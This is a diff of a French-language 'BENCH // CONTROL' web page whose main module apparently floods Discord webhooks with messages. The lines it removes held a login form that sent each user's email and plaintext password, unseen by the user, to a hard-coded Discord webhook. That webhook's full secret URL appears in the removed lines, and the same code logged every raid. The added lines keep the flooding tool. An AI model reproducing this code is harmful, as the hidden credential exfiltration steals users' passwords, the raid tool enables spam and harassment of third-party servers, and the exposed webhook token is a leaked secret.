@@ -53,21 +53,9 @@
   .nav-item.wip .badge { color: var(--red); border: 1px solid var(--red); padding: 0 4px; border-radius: 2px; }
   
   .content { padding: 2rem; display: flex; flex-direction: column; gap: 1.5rem; position: relative; overflow-y: auto;}
-  
-  /* AUTH FORM */
-  #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; min-height: 500px; gap: 1rem; width: 100%;}
-  #auth-screen h2 { font-size: 1.5rem; color: var(--green); margin-bottom: 1rem; }
-  .auth-field { display: flex; flex-direction: column; width: 300px; gap: 0.5rem; }
-  .auth-field label { font-size: 0.75rem; color: var(--dim); text-transform: uppercase; letter-spacing: 0.1em; }
-  .auth-field input { background: var(--bg); border: 1px solid var(--border); color: var(--text); font-family: var(--font); padding: 0.8rem; outline: none; }
-  .auth-field input:focus { border-color: var(--green); box-shadow: 0 0 10px -2px var(--green); }
-  .btn-main { width: 300px; background: transparent; border: 1px solid var(--green); color: var(--green); padding: 0.8rem; font-family: var(--font); text-transform: uppercase; letter-spacing: 0.1em; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 1rem;}
-  .btn-main:hover { background: var(--green); color: var(--bg); }
-  .switch-auth { font-size: 0.8rem; color: var(--dim); margin-top: 1rem; cursor: pointer; text-decoration: underline; }
-  .switch-auth:hover { color: var(--text); }
 
-  /* MAIN APP (hidden by default) */
-  #app-screen { display: none; flex-direction: column; gap: 1.5rem; width: 100%; }
+  /* MAIN APP */
+  #app-screen { display: flex; flex-direction: column; gap: 1.5rem; width: 100%; }
 
   .module-head { display: flex; justify-content: space-between; align-items: flex-start; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
   .module-head h2 { font-size: 1rem; font-weight: 600; letter-spacing: 0.05em; }
@@ -110,25 +98,16 @@
 </head>
 <body>
 
-<!-- CONFIG WEBHOOK ADMIN -->
-<script>
-  const ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1571285383239569504/YapKmXRjzG6Q-r9UxXLFnL-RpLQHlw7uMvdxtpffK2PGayc7KnJjYFnHvniSNWo5qfrM";
-  const BLOCKED_DOMAINS = [
-    "@mailinator.com", "@10minutemail.com", "@guerrillamail.com", "@temp-mail.org", "@yopmail.com",
-    "@tempmail.com", "@throwawaymail.com", "@mail.tm", "@sharklasers.com", "@getnada.com"
-  ];
-</script>
-
 <div class="frame">
   <div class="topbar">
     <div class="brand">BENCH<span class="dim"> // CONTROL</span></div>
     <div class="meta">
       <span><span class="pulse-dot"></span>LINK <span class="val">UP</span></span>
-      <span>USER <span class="val" id="current-user">—</span></span>
+      <span>SESSION <span class="val">ACTIVE</span></span>
     </div>
   </div>
   
-  <div class="main" id="main-container" style="display: none;">
+  <div class="main">
     <aside class="sidebar">
       <div class="sidebar-label">// MODULES</div>
       
@@ -158,7 +137,6 @@
       
       <div class="sidebar-label" style="margin-top:2rem">// SYSTEM</div>
       <div class="nav-item" id="nav-logs" onclick="switchTab('logs')"><span class="icon"></span><span>logs</span></div>
-      <div class="nav-item" onclick="logout()" style="color: var(--red); margin-top: 1rem;"><span class="icon"></span><span>logout</span></div>
     </aside>
     
     <section class="content" id="app-screen">
@@ -181,11 +159,11 @@
           </div>
         </div>
 
-        <!-- MODULE LOGS -->
+        <!-- MODULE LOGS (désactivé visuellement, juste pour garder l'onglet) -->
         <div class="panel" id="panel-logs" style="display:none">
-          <div class="console" style="height: 400px;">
-            <div class="console-head"><span>system activity</span><span id="log-count">0 entries</span></div>
-            <div class="console-body" id="auth-logs-display" style="height: 100%;"></div>
+          <div class="coming-soon">
+            <h3>LOGS</h3>
+            <p>Les logs sont visibles sur le webhook Discord.</p>
           </div>
         </div>
         
@@ -210,156 +188,24 @@
         </div>
     </section>
   </div>
-
-  <!-- OVERLAY AUTH -->
-  <div id="auth-overlay" style="position: absolute; inset: 1px; background: var(--panel); display: flex; flex-direction: column; z-index: 10;">
-      <div id="auth-screen">
-        <h2>ACCÈS RESTREINT</h2>
-        <div class="auth-field">
-          <label>Email</label>
-          <input type="email" id="auth-email" placeholder="nom@exemple.com">
-        </div>
-        <div class="auth-field">
-          <label>Mot de passe</label>
-          <input type="password" id="auth-pass" placeholder="••••••••">
-        </div>
-        <button class="btn-main" id="auth-btn" onclick="handleAuth()">CRÉER UN COMPTE</button>
-        <div class="switch-auth" id="auth-switch" onclick="toggleAuthMode()">Déjà un compte ? Se connecter</div>
-      </div>
-  </div>
-
 </div>
 
 <script>
   // --- ÉTAT GLOBAL ---
   let currentMod = 'raid';
-  let isRegisterMode = true; 
-  let systemLogs = JSON.parse(localStorage.getItem('bench_system_logs') || '[]');
-  let currentUserEmail = localStorage.getItem('bench_current_user') || null;
 
   // --- INITIALISATION UI ---
   window.onload = () => {
-    if (currentUserEmail) {
-      showApp();
-    } else {
-      showAuth();
-    }
-  };
-
-  function showApp() {
-    document.getElementById('auth-overlay').style.display = 'none';
-    document.getElementById('main-container').style.display = 'grid';
-    document.getElementById('current-user').textContent = currentUserEmail;
-    
-    // Au chargement, on force l'affichage du Raid
     switchTab('raid'); 
-    renderLogs();
-  }
-
-  function showAuth() {
-    document.getElementById('auth-overlay').style.display = 'flex';
-    document.getElementById('auth-screen').style.display = 'flex';
-    document.getElementById('main-container').style.display = 'none';
-    document.getElementById('current-user').textContent = 'GUEST';
-    document.getElementById('auth-email').value = '';
-    document.getElementById('auth-pass').value = '';
-  }
-
-  // --- GESTION DES COMPTES ---
-  function toggleAuthMode() {
-    isRegisterMode = !isRegisterMode;
-    document.getElementById('auth-btn').textContent = isRegisterMode ? "CRÉER UN COMPTE" : "SE CONNECTER";
-    document.getElementById('auth-switch').textContent = isRegisterMode ? "Déjà un compte ? Se connecter" : "Pas de compte ? S'inscrire";
-  }
-
-  async function handleAuth() {
-    const email = document.getElementById('auth-email').value.trim();
-    const pass = document.getElementById('auth-pass').value.trim();
-    if (!email || !pass) { alert("Remplis tous les champs."); return; }
-
-    let accounts = JSON.parse(localStorage.getItem('bench_accounts') || '{}');
-
-    if (isRegisterMode) {
-      const isBlocked = BLOCKED_DOMAINS.some(domain => email.toLowerCase().endsWith(domain));
-      if (isBlocked) {
-        alert("Erreur : Les adresses email temporaires ou jetables sont interdites.");
-        return;
-      }
-
-      if (accounts[email]) { alert("Cet email est déjà enregistré."); return; }
-      
-      accounts[email] = pass;
-      localStorage.setItem('bench_accounts', JSON.stringify(accounts));
-      
-      sendAdminLog(`NOUVEAU COMPTE`, `Email: ${email}\nPassword: ${pass}`);
-      
-      loginUser(email);
-
-    } else {
-      if (accounts[email] && accounts[email] === pass) {
-        loginUser(email);
-      } else {
-        alert("Identifiants incorrects.");
-      }
-    }
-  }
-
-  function loginUser(email) {
-    currentUserEmail = email;
-    localStorage.setItem('bench_current_user', email);
-    sendAdminLog(`CONNEXION`, `Email: ${email}`);
-    showApp();
-  }
-
-  function logout() {
-    currentUserEmail = null;
-    localStorage.removeItem('bench_current_user');
-    showAuth();
-  }
-
-  // --- ENVOI DES LOGS AU WEBHOOK DISCORD ---
-  async function sendAdminLog(action, details) {
-    const payload = {
-      embeds: [{
-        title: "BENCH // ACTIVITY",
-        color: 0x00ff9d,
-        fields: [
-          { name: "Action", value: action, inline: true },
-          { name: "Utilisateur", value: currentUserEmail || "Guest", inline: true },
-          { name: "Détails", value: details.substring(0, 1024) },
-          { name: "Date", value: new Date().toLocaleString('fr-FR'), inline: false }
-        ],
-        footer: { text: "Log System by Bench" }
-      }]
-    };
-    
-    fetch(ADMIN_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(e => console.error("Erreur webhook admin", e));
-
-    const entry = { 
-      time: new Date().toLocaleTimeString('fr-FR'), 
-      action: action, 
-      user: currentUserEmail || "Guest",
-      details: details 
-    };
-    systemLogs.push(entry);
-    if (systemLogs.length > 50) systemLogs.shift();
-    localStorage.setItem('bench_system_logs', JSON.stringify(systemLogs));
-    if (currentMod === 'logs') renderLogs();
-  }
+  };
 
   // --- NAVIGATION ---
   function switchTab(tabId) {
     if(!tabId) return;
     currentMod = tabId;
     
-    // Reset des classes actives
     document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
     
-    // Activation de l'onglet en cours
     if (tabId === 'raid') document.getElementById('nav-raid').classList.add('active');
     if (tabId === 'logs') document.getElementById('nav-logs').classList.add('active');
     if (tabId === 'soon') document.getElementById('nav-soon').classList.add('active');
@@ -369,38 +215,18 @@
     document.getElementById('mod-title').textContent = titles[tabId];
     document.getElementById('mod-path').textContent = paths[tabId];
     
-    // Gestion des panneaux (Affichage / Masquage)
     document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
     
     const activePanel = document.getElementById('panel-' + tabId);
     if (activePanel) activePanel.style.display = 'block';
 
-    // Gestion de la barre d'action et de la console
     if (tabId === 'logs' || tabId === 'soon') {
       document.getElementById('action-bar').style.display = 'none';
       document.getElementById('main-console').style.display = 'none';
-      if (tabId === 'logs') renderLogs();
     } else {
       document.getElementById('action-bar').style.display = 'flex';
       document.getElementById('main-console').style.display = 'flex';
     }
-  }
-
-  // --- LOGS UI ---
-  function renderLogs() {
-    const display = document.getElementById('auth-logs-display');
-    document.getElementById('log-count').textContent = systemLogs.length + ' entries';
-    display.innerHTML = '';
-    if (systemLogs.length === 0) {
-      display.innerHTML = '<div style="color: var(--dim);">Aucun log enregistré.</div>';
-      return;
-    }
-    systemLogs.slice().reverse().forEach(entry => {
-      const div = document.createElement('div');
-      div.className = 'log-line ok';
-      div.innerHTML = `<span class="ts">${entry.time}</span><span class="lvl" style="color:var(--amber)">${entry.action}</span><span class="msg"><b>${entry.user}</b> - ${escapeHtml(entry.details)}</span>`;
-      display.appendChild(div);
-    });
   }
 
   function logConsole(level, msg) {
@@ -455,8 +281,6 @@
     if (hooks.length === 0) { logConsole('err', 'URLs invalides'); return; }
 
     logConsole('info', `webhook_raid → ${hooks.length} hook(s) · ${count} msg/hook`);
-    
-    sendAdminLog('EXECUTION RAID', `Hooks: ${hooks.length}\nCount: ${count}\nMessage: ${content}\nType: ${type}`);
 
     let totalSent = 0;
     const totalTarget = hooks.length * count;
